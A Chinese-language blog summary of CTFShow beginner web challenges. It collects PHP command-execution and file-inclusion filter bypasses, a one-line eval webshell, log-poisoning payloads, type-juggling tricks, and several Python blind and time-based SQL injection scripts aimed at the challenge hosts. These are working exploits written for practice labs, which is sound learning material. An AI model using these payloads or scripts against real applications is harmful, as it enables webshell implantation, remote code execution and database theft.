---
title: CTFSHOW WEB入门 Ttick总结
date: 2020-11-01 18:01:49
categories: 
- [CTF做题记录]
- [总结]
---

~~只记录一些tick，不是wp~~随便写写
>PHP文档中使用的伪类型与变量
>- `mixed` --> 说明一个参数可以接受多种不同的（但不一定是所有的）类型
例如 gettype() 可以接受所有的 PHP 类型，str_replace() 可以接受字符串和数组
>- `number` --> 说明一个参数可以是 integer 或者 float
>- `array|object` --> 意思是参数既可以是 array 也可以是 object
>- `void` --> 作为返回类型意味着函数的返回值是无用的。void 作为参数列表意味着函数不接受任何参数。从 PHP 7.1 开始 void 接受一个函数为返回类型
>- `...` --> 在函数原型中，`$...` 表示等等的意思。当一个函数可以接受任意个参数时使用此变量名
<!--more-->
# 信息搜集
## web5
php文件泄露，访问`index.phps`
## web6
常见文件备份参见[此博客](https://www.cnblogs.com/Lmg66/p/13598803.html)
##  web14
泄露重要(editor)的信息 直接在url后面添加/editor
## web16
payload:`/tz.php` --> 雅黑PHP探针\
PHP探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag
## web19
前台输入密码浏览器转码了，抓包重放
## web20
mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag

---
# 爆破
## web21
bp爆破的custom iterator(自定义迭代器)应用\
需要进行base64编码：payload processing 进行编码设置\
取消Palyload Encoding编码 因为在进行base64加密的时候在最后可能存在 == 这样就会影响base64 加密的结果

---
# 命令执行（RCE）
## web31
`if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c))`\
过滤空格：`%09`、`${IFS}`、`$IFS$9`、`<>`、`<`
自己的payload：?c=echo(\`tail%09f*\`);
搜集的：

```php
show_source(next(array_reverse(scandir(pos(localeconv())))));

c=$a=show_source($_GET[1])?>&1=flag.php

c=eval($_GET[1])?>&1=system('cat flag.php');

c=?><?=`$_GET[1]`;&1=cat flag.php//查看源代码
c=?><?=passthru($_GET[1]);&1=cat flag.php//查看源代码
```
## web32-36
``if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c))``\
payload:
`?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php`
## web37/39
```php
if(!preg_match("/flag/i", $c)){
    include($c);
    echo $flag;
}
if(!preg_match("/flag/i", $c)){
    include($c.".php");
}
//?c=data://text/plain,<?php system('cat f*');?>
//39 output：$flag="flag{8262a004-69e7-460b-b412-05d4178c08f8}";.php
//39 data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用
```
## web38
```php
if(!preg_match("/flag|php|file/i", $c)){
    include($c);
    echo $flag;
}
//过滤了php和file
//?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==
```
## web40
```php
if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
    eval($c);
}
```
这题跟[GXYCTF2019的禁止套娃](https://yq1ng.github.io/z_post/BUUOJ-[GXYCTF2019]-WEB-WP/#%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83)很像，参考一下\
在看一个利用session的~~题解~~
`?c=session_start();system(session_id());`
在session处添加一条记录：`PHPSESSID:ls`，可以列出文件，再改成`c=session_start();highlight_file(session_id());`，flag读不出来。。凉
>引自[羽大佬博客](https://blog.csdn.net/miuzzx/article/details/108415301)\
经过测试发现，受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的
## [web41](https://blog.csdn.net/miuzzx/article/details/108569080)
```php
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
    eval("echo($c);");}
```
exp已经保存了，哈哈
## web42
`system($c." >/dev/null 2>&1");`\
详解：https://blog.csdn.net/ithomer/article/details/9288353
>`/dev/null` ：代表空设备文件\
`>`  ：代表重定向到哪里，例如：echo "123" > /home/123.txt\
`1`  ：表示stdout标准输出，系统默认值是1，所以">/dev/null"等同于"1>/dev/null"\
`2`  ：表示stderr标准错误\
`&`  ：表示等同于的意思，2>&1，表示2的输出重定向等同于1\

`1 > /dev/null 2>&1 `语句含义：\
`1 > /dev/null` ： 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。\
`2>&1` ：接着，标准错误输出重定向（等同于）标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。\
payload：`?c=cat flag*%0a`，`%0a`进行换行
## web52
```php
if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c))
```
往上payload：`?c=nl${IFS}fla%27%27g.php%0a`通杀
## web54
```php
if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c))
    system($c);
```
payload：`?c=/bin/?at${IFS}f???????`\
cat什么的被过滤了就要从bin下再把它引出来
## web55
```php
<?php
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```
Lazzaro师傅真狠啊，字母全凉了，不过羽师傅提供了一个[骚思路](https://blog.csdn.net/qq_46091464/article/details/108555433)，真是活久见。。

1. payload：`?c=/???/????64 ????.???` -->  `/bin/base64 flag.php`
2. 通过该命令压缩flag.php 然后进行下载\
    payload：`?c=/???/???/????2 ????.???`
    也就是`/usr/bin/bzip2 flag.php`
    然后访问`/flag.php.bz2`进行下载获得`flag.php`

## web56
```php
if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c))
```
和上题类似，过滤内容变了，这次数字也不能用了，附上[P牛博客](leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)和[Firebasky师傅博客](https://blog.csdn.net/qq_46091464/article/details/108513145)还有[Y1ng师傅](https://www.gem-love.com/websecurity/1407.html)\
linux中`.`相当于`source`可以执行sh命令，且无需执行权限，[具体介绍点此](http://blog.sina.com.cn/s/blog_af68a2c201016nh2.html)\

1. 构造上传页面
    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>POST数据包POC</title>
    </head>
    <body>
    <form action="http://45e8c3c6-fd54-4110-a17f-3dff9f3e68a2.chall.ctf.show/" method="post" enctype="multipart/form-data">
    <!--链接是当前打开的题目链接-->
        <label for="file">文件名：</label>
        <input type="file" name="file" id="file"><br>
        <input type="submit" name="submit" value="提交">
    </form>
    </body>
    </html>
    ```
2. 抓包，构造poc命令执行\
发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母，看一下ASCII表，可以发现大写字母在`@`和`[`之间，而Linux的glob通配符支持利用`[0-9]`来表示一个范围，那么就可以用`[@-[]`来表示大写字母\
![ASCII](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.png)

然后传文件，并添加sh命令，有时候并不会执行成功，因为最后一位不一定一直是大写字母，多试几次\
`/?c=.%20/???/????????[@-[]`

```sh
#!/bin/sh
ls
```
![result_ls](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.xqklo38zuce.png)

接着读取flag即可

## web57
```php
<?php
// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```
不懂，上payload：`$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))`

![](https://img-blog.csdnimg.cn/20201105182344281.png#pic_center)
输出36
>原理\
`${_} ="" ` //返回上一次命令\
`$((${_}))=0`\
`$((~$((${_}))))=-1`\
然后拼接出-36在进行取反

多学一招
## web71
```php
<?php
//@Author: Lazzaro
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();//读取缓冲区内容，不清楚缓冲区
        ob_end_clean();//清楚缓冲区
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>
你要上天吗？
```
~~没见过这样的~~，payload：`c=include('/flag.txt');exit();`\
试了试，不用`exit();`的话，后面会被替换为`???`之类的

# 文件包含(LFI)
## web79
```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```
过滤了php，可以用`data`协议执行系统函数，payload：`?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <?php system('cat flag.php');`
## web80&81
```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```
日志包含，bp抓包改UA头`<?php system("ls");?>`，接着cat或者`<?php system(base64 fl0g.php';?)`

# PHP特性
## web89
>数组绕过正则表达式\
返回完整匹配次数（可能是0），或者如果发生错误返回FALSE
```php
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```
没想到数组，那就记下来，payload：`?num[]=1`
## web91
```php
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```
payload:`?cmd=%0aphp`（%0a就是换行or`\n`）\
很有意思，首先要知道`^$`是匹配一段文本中每行的开始和结束位置，在看他俩的介绍
>`^` 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 '\n' 或 '\r' 之后的位置\
`$` 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 '\n' 或 '\r' 之前的位置
![i m](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.8i160rqgpag.png)

第一次匹配是多行（成功），第二次一行（失败），传入payload正好可以绕过
## web90 | 92 | 93 | 94 | 95
```php
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```
>`strpos()` --> strpos — 查找字符串首次出现的位置\
>- `strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : int`\
返回 needle 在 haystack 中首次出现的数字位置\
`offset` --> 如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始(-3：从倒数第三个字符开始查找)。

>`intval()` -->  获取变量的整数值(向下取整)(`ceil()`向上取整)
>- `intval ( mixed $var [, int $base = 10 ] ) : int`\
通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。
>- Note:\
如果 base 是 0，通过检测 var 的格式来决定使用的进制：
>>如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
>>如果字符串以 "0" 开始，使用 8 进制(octal)；否则，\
>>将使用 10 进制 (decimal)。

PHP很有意思的特性，大多函数总是会修剪多余的空白字符，所以只需要用八进制，并在数值前加上空格即可，payload：`?num= 010574`\
补：92Hint:\
intval()函数如果`$base`为0则`$var`中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以
## web98
这题看见直接懵逼了，可怕的三目运算，其实不想记录的，纠结一下还是写上吧，算是代码混淆，吓走你哈哈哈
```php
<?php
include("flag.php");
$_GET?$_GET=&$_POST:'flag';//如果GET到参数就用POST得的flag参数覆盖
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
?>
```
中间两行GET没用，不传flag\
payload：`GET: ?a=a` `POST: HTTP_FLAG=flag`
## web99
```php
<?php
highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));//向数组里面插入随机数
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1
    file_put_contents($_GET['n'], $_POST['content']);
}
?>
```
>`in_array()` --> 检查数组中是否存在某个值
>- `in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool`\
大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较
>- `strict` 如果第三个参数 strict 的值为 TRUE 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同\
可以理解为不加true就是弱比较(==)，加上true就是强比较(===)

payload：`GET: n=1.php` `POST: content=<?php eval($_POST[1]);?>`之后蚁剑

## web100 | 101

```php
<?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
}
```

预期解：

1. and与&&的区别\
   `$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);`\
   只需要第一个是数值即可使v0为数值
   `$v0=is_numeric($v1) && is_numeric($v2) && is_numeric($v3);`
   需要全部都是数值
2. [反射类](https://www.php.net/manual/zh/class.reflectionclass.php)\
   不过最简单的就是new一个类在输出，payload：`?v1=1&v2=echo new ReflectionClass&v3=;`\
100非预期：\
看到`eval`就应该想起来前面练习的RCE~~没想起来~~方法较多\
payload：\
``?v1=1&v2=&v3=?><?=`tail ctfshow.php`;``\
``?v1=1&v2=?><?php echo `ls`?>/*&v3=;*/``

## web102 | 103

```php
<?php
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}
```

考点：`hex2bin()`\
大意就是找出一个经过16进制编码后一句话，其不带任何字母，再经过`call_user_func()`调用`hex2bin()`转换回去写到文件里面进行getshell
```php
<?php
$a='<?=`cat *`;';
$b=base64_encode($a);  // PD89YGNhdCAqYDs=
$c=bin2hex($b);      //这里直接用去掉=的base64
//输出   5044383959474e6864434171594473
```
payload：(v2前面随便加两个数字，绕substr的)\
`GET: v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php` `POST: v1=hex2bin`
## web104 | 106
```php
<?php
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['v1']) && isset($_GET['v2']){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        //106：if(sha1($v1)==sha1($v2) && $v1!=$v2)   --> v1[]=1 v2[]=2
        echo $flag;
    }
}
?>
```
弱比较，和ma5一样，数组绕过，也可以用这个
```
aaK1STfY
0e76658526655756207688271159624026011393
aaO8zKZF
0e89257456677279068558073954252716165668
```
## web105
```php
<?php
highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){//GET不能覆盖error
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){//POST值不能为flag
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){//不能直接赋值flag=flag
    die($error);
}
echo "your are good".$flag."\n";
die($suces);//通过覆盖suces为flag的值得到flag
?>
```
看到`foreach`就想起来变量覆盖
>`foreach (array_expression as $key => $value)`键名=>键值
## web107
可以说是变量覆盖的一种?
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");
if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }
}
?>
```
>`parse_str()` --> 将字符串解析成多个变量\
`parse_str ( string $encoded_string [, array &$result ] ) : void`\
如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。\
如果未设置 array 参数，则由该函数设置的变量将覆盖已存在的同名变量。\
PHP 的变量名不能带「点」和「空格」，所以它们会被转化成下划线。 用本函数带 result 参数，也会应用同样规则到数组的键名。\
php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。

payload:`GET:?v3=yq1ng` `POST: v1=flag=9618785fbf6d1b09b13d336d040f1880`(flag值为yq1ng加密md5)
## web108
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");
if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE{//类似 preg_match() ，但 preg_match() 比其更快
    die('error');
}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){//对c逆序，取整数,0x36d==877
    echo $flag;
}
?>
```
ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配\
payload：`?c=a%00778`
## web109
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");//找到一个内置类，使其不报错且能echo，Exception，ReflectionClass
    }
?>
```
payload:\
` ?v1=Exception&v2=system('cat *')`\
`?v1=Reflectionclass&v2=system('cat *')`
## web110
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");
}
?>
```
[filesystemiterator手册](https://www.php.net/manual/zh/class.filesystemiterator.php)
- [php 快速获取文件夹中文件数量](http://phpff.com/filesystemiterator)
    ```php
    <?php
    $iterator = new FilesystemIterator(__DIR__, FilesystemIterator::SKIP_DOTS);
    //计算迭代器中元素的个数
    printf("There were %d Files", iterator_count($iterator));
    ?>
    ```

`getcwd()` --> 获取当前工作目录 返回当前工作目录\
payload: `?v1=FilesystemIterator&v2=getcwd`

# sql
## web174
补：我回来了，不用脚本，结果没flag关键字就行，right、hex等等直接淦\
`$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";`\
~~妈的(无能狂怒)，~~ 是盲注，道行太浅一直没想到，脚本：
```python
import requests

flag = ''
for i in range(1, 45):
    for j in r'0123456789abcdefghijklmnopqrstuvwxyz-{}':
        url = "http://eaf7f762-c08b-4374-b8d1-396518d73c69.chall.ctf.show/api/v4.php?id="
        payload = '''1' and substr((select password from ctfshow_user4 where username="flag"),%d,1)="%c"--+'''% (i,j)
        r = requests.get(url + payload)
        #print(url+payload)
        #print(r.text)
        if 'admin' in r.text:
            flag += j
            print(flag)
            break
```
## web175
` if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){`过滤了所有字符，时间盲注\
11.18补：群主思路：将查询结果输出到文件，在访问。。。骚\
payload: `1' union select 1,password from ctfshow_user5 where username 'flag' into outfile '/var/wa/html/ctf.txt'-- A`
```py
# encoding: utf-8
import requests
import time

url = '''http://14e03d71-0f5b-4a4d-b819-884aeb24fbe8.chall.ctf.show/api/v5.php?id=1' '''
flag = ''

for i in range(1,50):
    for j in r'{}0123456789abcdefghijklmnopqrstuvwxyz-':
        #开始计时
        before_time = time.time()
        payload = 'and if(substr((select password from ctfshow_user5 where username="flag"),%d,1)="%c",sleep(3),0)--+'% (i,j)
        r = requests.get(url+ payload)
        #返回时间
        after_time = time.time()
        offset = after_time - before_time
        if offset > 2.8:
            flag += j
            print(flag)
            break
```

## web176-179
sql：`$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";`\
waf未知\
payload：`URL/api/?id='or(1)%23`通杀

## web180
payload：`URL/api/?id='or(mid(username,1,1)='f')and'1'='1`

## web181 | 182
sql语句：`$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";`\
waf：`preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str)`\
通杀payload：`URL/api/?id='or(mid(username,1,1)='f')and'1'='1`
## web183
sql：`$sql = "select count(pass) from ".$_POST['tableName'].";";`\
waf：`preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str)`\
盲注，一开始用的`mid()`，数据干扰太多，用了`right()`，附上*一样的脚本，需要手动停止，没~~懒得~~判断嘿嘿
```python
# encoding: utf-8
import requests

url = '''http://898034b5-dc30-4856-9230-a65688cba1ac.chall.ctf.show/select-waf.php'''
data = {"tableName":""}
flag = '}'
s = requests.session()

for x in range(2,50):
    for y in r'abcdefghijklmnopqrstuvwxyz{-}0123456789':
        data["tableName"]="(ctfshow_user)where(right(pass,%d))like'%s'"%(x,y+flag)
        #print(data)
        s = requests.post(url,data = data)
        #print(s.text)  
        if '$user_count = 1;' in s.text:
            flag = y + flag
            print(flag)
            break
```
## web184
sql：`$sql = "select count(*) from ".$_POST['tableName'].";";`\
waf：``preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str)``\
emmm，费老牛鼻子劲，太菜了，嘤嘤嘤，第一次用join写脚本，用群主的字典效率高点
```python
# encoding: utf-8
# py2
import requests

url = '''http://e5e91710-3aa2-4752-a2a0-68a6c18fee26.chall.ctf.show/select-waf.php'''
data = {"tableName":""}
flag = 'flag{'

for x in range(6,50):
    for y in r'abcdefghijklmnopqrstuvwxyz0123456789{-}':
        #字典：flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}   #群主亲传效率高
        temp = "0x"+(flag+y).encode('hex')
        data["tableName"]='ctfshow_user x right join ctfshow_user y on left(y.pass,%d) like %s'%(x,temp)
        #print(data)
        s = requests.post(url,data = data)
        #print(s.text)  
        if '$user_count = 22;' not in s.text:
            flag =  flag + y
            print(flag)
            break
```
## web185 | 186
185的sql和waf忘了写，不过都是一个脚本，没差\
186sql：`$sql = "select count(*) from ".$_POST['tableName'].";";`\
186waf：``preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\<|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str)``\
额，这么慢才出。。。耽搁挺长时间，还是自己太菜了，欸，if的43先自己判断下，系列题目，flag格式固定
![waf数字](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.e8x3axfwwan.png)
![waf数字字母](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.oys89ez7sjb.png)
```python
# encoding: utf-8
# @Author:  yq1ng
# @Date:    2020-11-09 18:30

import requests

url = '''http://7a27816c-2c96-4544-b3ba-f0867f97f250.chall.ctf.show//select-waf.php'''
data = {"tableName":""}
flag = 'flag{'
payload = ''

def Construct_numbers(num):
    result = '!(!pi())'
    if num != 1:
        for i in range(num-1):
            result = result+'+'+'!(!pi())'
    return result

for x in range(6,43):
    for y in r'abcdefghijklmnopqrstuvwxyz0123456789{-}':
        #字典：flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}   #群主亲传效率高
        data["tableName"] = 'ctfshow_user x right join ctfshow_user y on (hex(substr(y.pass,%s,%s)))like(hex(%s))'%(Construct_numbers(x),Construct_numbers(1),Construct_numbers(ord(y)))
        #print(data)
        s = requests.post(url,data = data)
        #print(s.text)
        if '$user_count = 43;' in s.text:
            flag += y
            print(flag)
            break
```
附上群主的脚本，更快，更美观
```python
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-11-07 05:00:51
# @Last Modified by:   h1xa
# @Last Modified time: 2020-11-07 16:28:53
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

import requests

url = 'http://7a27816c-2c96-4544-b3ba-f0867f97f250.chall.ctf.show//select-waf.php'

payload = 'ctfshow_user as a right join ctfshow_user as b on hex(substr(b.pass,{},{}))regexp(hex({char}))'

strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'

prefix= 'flag{'

def create_num(num):
	ret = 'hex(ceil(cot(-(ascii(char_length(now()))))))'
	if num != 1:
		for i in range(num-1):
			ret = ret+'+'+'hex(ceil(cot(-(ascii(char_length(now()))))))'
	return ret;


def getFlag():
	#proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
	flag=''
	for i in range(42):
		print('[+] 开始盲注第{}位'.format(i+1))
		for n in strings:
			data = {
				'tableName':payload.format(create_num(i+1),create_num(1),char=create_num(ord(n)))
			}
			ret = requests.post(url,data)
			#ret = requests.post(url,data,proxies = proxies,verify=False);
			if ret.text.find('43')>0:
				if i < 5:
					if n in prefix:
						flag=flag+n
						print('[+] 盲注第{}位'.format(i+1)+"字符{}".format(n)+"成功")
				else:
					flag=flag+n
					print(data)
					#print(ret.text)
					print('[+] 盲注第{}位'.format(i+1)+"字符{}".format(n)+"成功")
				break
			#else:
				#print('[+] 盲注第{}位'.format(i+1)+"字符{}".format(chr(n))+"失败 数字为{}".format(n))
				#print('[+] payload为{}'.format(payload.format(create_num(i+1),create_num(1),char=create_num(ord(n)))))
	return flag

print(getFlag())
```
## web187
sql: `$sql = "select count(*) from ctfshow_user where username = '$username' and password= '$password'";`
```php
//waf:
    $username = $_POST['username'];
    $password = md5($_POST['password'],true);

    //只有admin可以获得flag
    if($username!='admin'){
        $ret['msg']='用户名不存在';
        die(json_encode($ret));
    }
```
`md5($_POST['password'],true)`很经典的一个题目，详细了解可移步我的[这篇博客](https://yq1ng.github.io/z_post/BJDCTF2020%E5%85%A8%E5%AE%B6%E6%A1%B6/#bjdctf2020easy-md5)，直接用`ffifdyop`作为密码登陆即可
## web188
sql：`$sql = "select pass from ctfshow_user where username = {$username}";`
```php
//waf
 //用户名检测
  if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }
```
